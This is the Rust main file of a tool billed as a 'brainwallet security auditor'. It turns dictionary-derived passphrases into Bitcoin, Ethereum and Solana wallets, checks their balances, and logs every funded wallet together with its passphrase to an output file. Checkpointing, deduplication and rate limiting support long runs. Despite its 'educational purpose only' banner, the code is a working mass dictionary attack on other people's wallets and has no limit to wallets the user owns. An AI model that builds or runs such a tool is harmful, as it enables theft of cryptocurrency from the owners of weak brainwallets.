use anyhow::Result;
use clap::Parser;
use std::sync::Arc;
use tracing::{info, warn};

mod config;
mod dictionary;
mod pattern;
mod wallet;
mod balance;
mod stats;
mod checkpoint;
mod bloom;
mod notifications;

use crate::config::Config;
use crate::dictionary::DictionaryLoader;
use crate::pattern::PatternGenerator;
use crate::wallet::WalletGenerator;
use crate::balance::BalanceChecker;
use crate::stats::Statistics;
use crate::checkpoint::CheckpointManager;
use crate::bloom::BloomFilterManager;
use crate::notifications::log_wallet_found;

/// Enterprise-grade brainwallet security auditor
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Config file path
    #[arg(short, long, default_value = "config.toml")]
    config: String,

    /// Resume from checkpoint
    #[arg(short, long)]
    resume: bool,

    /// Clear checkpoint and start fresh
    #[arg(long)]
    clear_checkpoint: bool,

    /// Max patterns to check (overrides config)
    #[arg(short, long)]
    max_patterns: Option<usize>,

    /// Enable verbose logging
    #[arg(short, long)]
    verbose: bool,

    /// Generate default config file and exit
    #[arg(long)]
    generate_config: bool,
}

#[tokio::main]
async fn main() -> Result<()> {
    // Parse CLI arguments
    let args = Args::parse();

    // Handle --generate-config flag
    if args.generate_config {
        let config_content = Config::default_toml();
        std::fs::write("config.toml", config_content)?;
        println!("✅ Default config file created: config.toml");
        return Ok(());
    }

    // Initialize logging
    init_logging(args.verbose)?;

    // Display banner
    display_banner();

    // Ensure output directory exists
    std::fs::create_dir_all("output")?;

    // Load configuration (create default if doesn't exist)
    let config = if !std::path::Path::new(&args.config).exists() {
        warn!("Config file not found: {}. Creating default config...", args.config);
        Config::save_default(&args.config)?;
        Config::load(&args.config)?
    } else {
        Config::load(&args.config)?
    };
    info!("Configuration loaded from: {}", args.config);

    // Override max patterns if specified
    let max_patterns = args.max_patterns.unwrap_or(config.attack.max_patterns);

    // Initialize checkpoint manager
    let checkpoint_manager = CheckpointManager::new("output/checkpoint.json")?;
    
    // Clear checkpoint if requested
    if args.clear_checkpoint {
        checkpoint_manager.clear()?;
        info!("Checkpoint cleared, starting fresh");
    }
    
    // Load checkpoint data (index and statistics)
    let (start_index, checkpoint_stats) = if args.resume {
        if let Some(checkpoint) = checkpoint_manager.load_full()? {
            info!("Resuming from checkpoint: index={}, checked={}, found={}, start_time={:?}", 
                  checkpoint.last_index, checkpoint.checked, checkpoint.found, checkpoint.start_time);
            (checkpoint.last_index, Some((checkpoint.checked, checkpoint.found, checkpoint.start_time)))
        } else {
            (0, None)
        }
    } else {
        (0, None)
    };

    info!("Starting from index: {}", start_index);
    
    // Initialize statistics
    let stats = Arc::new(Statistics::new());
    
    // Restore statistics from checkpoint if resuming, otherwise reset
    if let Some((checked, found, start_time)) = checkpoint_stats {
        stats.restore(checked, found, start_time);
        if let Some(original_start) = start_time {
            info!("Restored statistics: checked={}, found={}, original_start_time={}", checked, found, original_start);
        } else {
            info!("Restored statistics: checked={}, found={} (start_time not preserved)", checked, found);
        }
    } else {
        stats.reset();
    }

    // Initialize bloom filter (prevent duplicate checks)
    let bloom_filter = BloomFilterManager::new(
        config.optimization.bloom_capacity,
        0.001
    );
    
    // Track bloom filter failures to detect if it's consistently failing
    let bloom_failure_count = Arc::new(std::sync::atomic::AtomicU64::new(0));
    
    // Clear bloom filter if starting fresh (not resuming)
    if start_index == 0 {
        bloom_filter.clear();
    }

    // Ensure dictionaries are downloaded
    info!("Ensuring dictionaries are available...");
    DictionaryLoader::ensure_dictionaries(&config).await?;

    // Load dictionaries
    info!("Loading dictionaries...");
    let dictionaries = DictionaryLoader::load_all(&config)?;
    info!("Loaded {} dictionary entries", dictionaries.total_entries());

    // Generate attack patterns using lazy iterator (memory-efficient)
    info!("Generating attack patterns (lazy iterator mode)...");
    let patterns_iter = PatternGenerator::generate_iter(&dictionaries, &config);
    info!("Pattern iterator ready (patterns generated on-demand to save memory)");

    // Initialize components
    let wallet_generator = WalletGenerator::new(&config)?;
    let balance_checker = BalanceChecker::new(&config).await?;

    // Main attack loop
    info!("Starting attack loop...");
    info!("Target: {} patterns", max_patterns);

    let progress_bar = indicatif::ProgressBar::new(max_patterns as u64);
    progress_bar.set_style(
        indicatif::ProgressStyle::default_bar()
            .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} ({eta})")
            .unwrap()
            .progress_chars("#>-")
    );

    // Setup CTRL+C handler for graceful shutdown
    let (shutdown_tx, mut shutdown_rx) = tokio::sync::mpsc::channel::<()>(1);
    let shutdown_tx_clone = shutdown_tx.clone();
    
    tokio::spawn(async move {
        if let Err(e) = tokio::signal::ctrl_c().await {
            warn!("Failed to listen for Ctrl+C: {}", e);
            return;
        }
        info!("\n🛑 Received Ctrl+C, saving checkpoint and shutting down gracefully...");
        shutdown_tx_clone.send(()).await.ok();
    });

    // Use iterator with enumerate to track index
    // Skip patterns up to start_index (for checkpoint resume)
    // CRITICAL: enumerate() must be AFTER skip() to get correct absolute index
    for (relative_idx, pattern) in patterns_iter.skip(start_index).enumerate() {
        // Calculate absolute index (for checkpoint and progress tracking)
        let i = start_index + relative_idx;
        
        // Check for shutdown signal (non-blocking)
        if shutdown_rx.try_recv().is_ok() {
            info!("Shutdown signal received, saving checkpoint...");
            checkpoint_manager.save(i, stats.checked(), stats.found(), Some(stats.start_time()))?;
            info!("✅ Checkpoint saved, exiting gracefully...");
            return Ok(());
        }

        if i >= max_patterns {
            break;
        }

        // Check bloom filter (skip duplicates)
        // Note: If bloom filter is disabled due to overflow, contains() may not work correctly
        // but we continue processing to avoid stopping the entire attack
        if bloom_filter.contains(&pattern) {
            continue;
        }
        
        // Proactive bloom filter management: clear at 95% capacity to prevent overflow
        // This prevents the bloom filter from reaching 100% and causing add() failures
        // NOTE: Clearing will cause previously checked patterns to be re-checked,
        // but this is acceptable to prevent overflow and crash
        if bloom_filter.is_near_capacity() {
            warn!("Bloom filter 95% full ({} / {}), clearing to prevent overflow...", 
                  bloom_filter.len(), bloom_filter.capacity());
            bloom_filter.clear();
            bloom_failure_count.store(0, std::sync::atomic::Ordering::Relaxed); // Reset counter after successful clear
        }

        // Generate wallet from pattern
        let wallets = match wallet_generator.generate(&pattern) {
            Ok(w) => w,
            Err(e) => {
                warn!("Failed to generate wallet: {}", e);
                continue;
            }
        };

        // Check balances with error handling
        // CRITICAL: Only add to bloom filter AFTER successful balance check
        // If API fails, we don't add to bloom filter so pattern can be retried later
        let results = match balance_checker.check(&wallets).await {
            Ok(r) => r,
            Err(e) => {
                warn!("Balance check failed for pattern {}: {}. NOT adding to bloom filter - will retry later", pattern, e);
                // Continue processing, don't crash
                // CRITICAL: Don't add to bloom filter on API failure - allows retry later
                // Don't increment checked count if balance check completely failed
                continue;
            }
        };

        // ONLY add to bloom filter after successful balance check
        // This ensures we don't mark patterns as "checked" when API fails
        // 
        // NOTE: BloomFilterManager.add() already performs proactive clearing at 95% capacity internally.
        // If add() still fails, it means the pattern is too large or there's an internal issue.
        // In this case, we use graceful degradation: continue processing without duplicate check.
        // Clearing and retrying here would be redundant and would cause previously checked
        // patterns to be lost, leading to duplicate API calls.
        if let Err(e) = bloom_filter.add(&pattern) {
            // Graceful degradation: continue without duplicate check for this pattern
            // This is acceptable - we'll process the pattern anyway, just without duplicate detection
            let failure_count = bloom_failure_count.fetch_add(1, std::sync::atomic::Ordering::Relaxed) + 1;
            warn!("Bloom filter add failed: {}. Continuing without duplicate check for this pattern. (Total failures: {})", e, failure_count);
            
            // Warn if bloom filter is consistently failing (might indicate a systemic issue)
            if failure_count % 100 == 0 {
                warn!("Bloom filter has failed {} times. Consider increasing bloom_capacity in config or investigating pattern sizes.", failure_count);
            }
            // Don't panic - continue processing the pattern
        } else {
            // Success - reset failure counter on successful add
            bloom_failure_count.store(0, std::sync::atomic::Ordering::Relaxed);
        }

        // Update statistics
        stats.increment_checked();

        // Found a wallet with balance > 0!
        if !results.is_empty() {
            stats.increment_found();
            
            // Log with colored output
            log_wallet_found(&pattern, &wallets, &results)?;

            // Save hit to file with all details
            save_hit(&pattern, &wallets, &results).await?;
        }

        // Update progress (less frequent checkpoint to reduce disk I/O)
        if i % 100 == 0 {
            progress_bar.set_position(i as u64);
            let rate = stats.get_rate();
            info!("Progress: {} | Rate: {:.2} w/s | Found: {}", 
                i, rate, stats.found());
        }

        // Save checkpoint less frequently (every 5000 patterns or on hit)
        if i % 5000 == 0 || !results.is_empty() {
            checkpoint_manager.save(i, stats.checked(), stats.found(), Some(stats.start_time()))?;
        }

        // Rate limiting
        if i % 50 == 0 {
            tokio::time::sleep(tokio::time::Duration::from_millis(
                config.rate_limiting.batch_cooldown_ms
            )).await;
        }
    }

    progress_bar.finish_with_message("Attack completed");

    // Final statistics
    let final_stats = serde_json::json!({
        "checked": stats.checked(),
        "found": stats.found(),
        "rate": stats.get_rate(),
        "elapsed_seconds": stats.elapsed(),
        "bloom_filter_entries": bloom_filter.len(),
        "timestamp": chrono::Utc::now().to_rfc3339(),
        "start_index": start_index,
        "max_patterns": max_patterns,
    });

    info!("═══════════════════════════════════════════════");
    info!("FINAL STATISTICS:");
    info!("Checked: {}", stats.checked());
    info!("Found: {}", stats.found());
    info!("Rate: {:.2} w/s", stats.get_rate());
    info!("Elapsed: {:.2}s", stats.elapsed());
    info!("Bloom filter entries: ~{}", bloom_filter.len());
    info!("═══════════════════════════════════════════════");

    // Save final statistics to file
    std::fs::write(
        "output/stats.json",
        serde_json::to_string_pretty(&final_stats)?
    )?;
    info!("Statistics saved to output/stats.json");

    // Save final checkpoint
    // Note: patterns_iter doesn't have a known length (lazy evaluation)
    // We use max_patterns as the final index since we iterate up to that limit
    checkpoint_manager.save(
        max_patterns,
        stats.checked(),
        stats.found(),
        Some(stats.start_time())
    )?;

    Ok(())
}

fn display_banner() {
    println!("
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   🎯 BRAINWALLET SECURITY AUDITOR v1.0                   ║
║   Enterprise-Grade Dictionary Attack Framework            ║
║                                                           ║
║   ⚠️  EDUCATIONAL PURPOSE ONLY                            ║
║   Only audit wallets you own or have permission to test  ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
    ");
}

fn init_logging(verbose: bool) -> Result<()> {
    let level = if verbose { "debug" } else { "info" };

    tracing_subscriber::fmt()
        .with_env_filter(level)
        .with_target(false)
        .with_thread_ids(true)
        .with_file(true)
        .with_line_number(true)
        .with_ansi(true) // Enable ANSI color codes
        .init();

    Ok(())
}

async fn save_hit(
    pattern: &pattern::AttackPattern,
    wallets: &wallet::WalletAddresses,
    results: &balance::BalanceResults,
) -> Result<()> {
    use std::fs::OpenOptions;
    use std::io::Write;

    let hit = serde_json::json!({
        "timestamp": chrono::Utc::now().to_rfc3339(),
        "pattern": {
            "type": pattern.pattern_type(),
            "value": pattern.to_string(),
            "priority": pattern.priority(),
        },
        "wallets": {
            "btc": wallets.btc,
            "eth": wallets.eth,
            "sol": wallets.sol,
        },
        "balances": results,
    });

    // Use NDJSON format (newline-delimited JSON) for better parsing
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("output/found_wallets.ndjson")?;

    // Compact JSON (not pretty) for NDJSON format
    writeln!(file, "{}", serde_json::to_string(&hit)?)?;

    Ok(())
}